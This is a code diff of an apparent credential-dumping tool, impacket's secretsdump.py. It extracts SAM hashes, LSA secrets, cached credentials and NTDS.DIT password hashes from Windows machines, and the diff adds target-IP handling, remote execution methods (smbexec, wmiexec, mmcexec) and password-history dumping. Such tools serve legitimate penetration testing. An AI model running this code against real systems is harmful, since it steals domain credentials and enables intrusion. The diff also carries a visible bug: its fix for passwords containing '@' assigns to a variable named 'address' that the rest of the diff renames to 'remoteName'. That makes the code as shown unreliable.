@@ -56,9 +56,10 @@ from impacket.smbconnection import SMBConnection
 from impacket.examples.secretsdump import LocalOperations, RemoteOperations, SAMHashes, LSASecrets, NTDSHashes
 
 class DumpSecrets:
-    def __init__(self, address, username='', password='', domain='', options=None):
+    def __init__(self, remoteName, username='', password='', domain='', options=None):
         self.__useVSSMethod = options.use_vss
-        self.__remoteAddr = address
+        self.__remoteName = remoteName
+        self.__remoteHost = options.target_ip
         self.__username = username
         self.__password = password
         self.__domain = domain
@@ -87,12 +88,13 @@ class DumpSecrets:
         self.__resumeFileName = options.resumefile
         self.__canProcessSAMLSA = True
         self.__kdcHost = options.dc_ip
+        self.__options = options
 
         if options.hashes is not None:
             self.__lmhash, self.__nthash = options.hashes.split(':')
 
     def connect(self):
-        self.__smbConnection = SMBConnection(self.__remoteAddr, self.__remoteAddr)
+        self.__smbConnection = SMBConnection(self.__remoteName, self.__remoteHost)
         if self.__doKerberos:
             self.__smbConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,
                                                self.__nthash, self.__aesKey, self.__kdcHost)
@@ -101,7 +103,7 @@ class DumpSecrets:
 
     def dump(self):
         try:
-            if self.__remoteAddr.upper() == 'LOCAL' and self.__username == '':
+            if self.__remoteName.upper() == 'LOCAL' and self.__username == '':
                 self.__isRemote = False
                 self.__useVSSMethod = True
                 localOperations = LocalOperations(self.__systemHive)
@@ -126,6 +128,7 @@ class DumpSecrets:
                             raise
 
                     self.__remoteOps  = RemoteOperations(self.__smbConnection, self.__doKerberos, self.__kdcHost)
+                    self.__remoteOps.setExecMethod(self.__options.exec_method)
                     if self.__justDC is False and self.__justDCNTLM is False or self.__useVSSMethod is True:
                         self.__remoteOps.enableRegistry()
                         bootKey             = self.__remoteOps.getBootKey()
@@ -162,7 +165,8 @@ class DumpSecrets:
                     else:
                         SECURITYFileName = self.__securityHive
 
-                    self.__LSASecrets = LSASecrets(SECURITYFileName, bootKey, self.__remoteOps, isRemote=self.__isRemote)
+                    self.__LSASecrets = LSASecrets(SECURITYFileName, bootKey, self.__remoteOps,
+                                                   isRemote=self.__isRemote, history=self.__history)
                     self.__LSASecrets.dumpCachedHashes()
                     if self.__outputFileName is not None:
                         self.__LSASecrets.exportCached(self.__outputFileName)
@@ -170,6 +174,9 @@ class DumpSecrets:
                     if self.__outputFileName is not None:
                         self.__LSASecrets.exportSecrets(self.__outputFileName)
                 except Exception, e:
+                    if logging.getLogger().level == logging.DEBUG:
+                        import traceback
+                        print traceback.print_exc()
                     logging.error('LSA hashes extraction failed: %s' % str(e))
 
             # NTDS Extraction we can try regardless of RemoteOperations failing. It might still work
@@ -190,6 +197,9 @@ class DumpSecrets:
             try:
                 self.__NTDSHashes.dump()
             except Exception, e:
+                if logging.getLogger().level == logging.DEBUG:
+                    import traceback
+                    print traceback.print_exc()
                 if str(e).find('ERROR_DS_DRA_BAD_DN') >= 0:
                     # We don't store the resume file if this error happened, since this error is related to lack
                     # of enough privileges to access DRSUAPI.
@@ -197,12 +207,17 @@ class DumpSecrets:
                     if resumeFile is not None:
                         os.unlink(resumeFile)
                 logging.error(e)
-                if self.__useVSSMethod is False:
+                if self.__justUser and str(e).find("ERROR_DS_NAME_ERROR_NOT_UNIQUE") >=0:
+                    logging.info("You just got that error because there might be some duplicates of the same name. "
+                                 "Try specifying the domain name for the user as well. It is important to specify it "
+                                 "in the form of NetBIOS domain name/user (e.g. contoso/Administratror).")
+                elif self.__useVSSMethod is False:
                     logging.info('Something wen\'t wrong with the DRSUAPI approach. Try again with -use-vss parameter')
             self.cleanup()
         except (Exception, KeyboardInterrupt), e:
-            #import traceback
-            #print traceback.print_exc()
+            if logging.getLogger().level == logging.DEBUG:
+                import traceback
+                print traceback.print_exc()
             logging.error(e)
             if self.__NTDSHashes is not None:
                 if isinstance(e, KeyboardInterrupt):
@@ -266,6 +281,8 @@ if __name__ == '__main__':
                         help='base output filename. Extensions will be added for sam, secrets, cached and ntds')
     parser.add_argument('-use-vss', action='store_true', default=False,
                         help='Use the VSS method insead of default DRSUAPI')
+    parser.add_argument('-exec-method', choices=['smbexec', 'wmiexec', 'mmcexec'], nargs='?', default='smbexec', help='Remote exec '
+                        'method to use at target (only when using -use-vss). Default: smbexec')
     group = parser.add_argument_group('display options')
     group.add_argument('-just-dc-user', action='store', metavar='USERNAME',
                        help='Extract only NTDS.DIT data for the user specified. Only available for DRSUAPI approach. '
@@ -278,7 +295,7 @@ if __name__ == '__main__':
                        help='Shows pwdLastSet attribute for each NTDS.DIT account. Doesn\'t apply to -outputfile data')
     group.add_argument('-user-status', action='store_true', default=False,
                         help='Display whether or not the user is disabled')
-    group.add_argument('-history', action='store_true', help='Dump password history')
+    group.add_argument('-history', action='store_true', help='Dump password history, and LSA secrets OldVal')
     group = parser.add_argument_group('authentication')
 
     group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
@@ -288,8 +305,12 @@ if __name__ == '__main__':
                              ' the ones specified in the command line')
     group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication'
                                                                             ' (128 or 256 bits)')
+    group = parser.add_argument_group('connection')
     group.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Address of the domain controller. If '
                                  'ommited it use the domain part (FQDN) specified in the target parameter')
+    group.add_argument('-target-ip', action='store', metavar="ip address",
+                       help='IP Address of the target machine. If ommited it will use whatever was specified as target. '
+                            'This is useful when target is the NetBIOS name and you cannot resolve it')
 
     if len(sys.argv)==1:
         parser.print_help()
@@ -304,13 +325,13 @@ if __name__ == '__main__':
 
     import re
 
-    domain, username, password, address = re.compile('(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(
+    domain, username, password, remoteName = re.compile('(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(
         options.target).groups('')
         
     #In case the password contains '@'
-    if '@' in address:
-        password = password + '@' + address.rpartition('@')[0]
-        address = address.rpartition('@')[2]
+    if '@' in remoteName:
+        password = password + '@' + remoteName.rpartition('@')[0]
+        address = remoteName.rpartition('@')[2]
 
     if options.just_dc_user is not None:
         if options.use_vss is True:
@@ -319,7 +340,7 @@ if __name__ == '__main__':
         elif options.resumefile is not None:
             logging.error('resuming a previous NTDS.DIT dump session not compatible with -just-dc-user switch')
             sys.exit(1)
-        elif address.upper() == 'LOCAL' and username == '':
+        elif remoteName.upper() == 'LOCAL' and username == '':
             logging.error('-just-dc-user not compatible in LOCAL mode')
             sys.exit(1)
         else:
@@ -330,15 +351,18 @@ if __name__ == '__main__':
         logging.error('resuming a previous NTDS.DIT dump session is not supported in VSS mode')
         sys.exit(1)
 
-    if address.upper() == 'LOCAL' and username == '' and options.resumefile is not None:
+    if remoteName.upper() == 'LOCAL' and username == '' and options.resumefile is not None:
         logging.error('resuming a previous NTDS.DIT dump session is not supported in LOCAL mode')
         sys.exit(1)
 
-    if address.upper() == 'LOCAL' and username == '':
+    if remoteName.upper() == 'LOCAL' and username == '':
         if options.system is None:
             logging.error('SYSTEM hive is always required for local parsing, check help')
             sys.exit(1)
     else:
+
+        if options.target_ip is None:
+            options.target_ip = remoteName
 
         if domain is None:
             domain = ''
@@ -351,8 +375,11 @@ if __name__ == '__main__':
         if options.aesKey is not None:
             options.k = True
 
-    dumper = DumpSecrets(address, username, password, domain, options)
+    dumper = DumpSecrets(remoteName, username, password, domain, options)
     try:
         dumper.dump()
     except Exception, e:
+        if logging.getLogger().level == logging.DEBUG:
+            import traceback
+            print traceback.print_exc()
         logging.error(e)
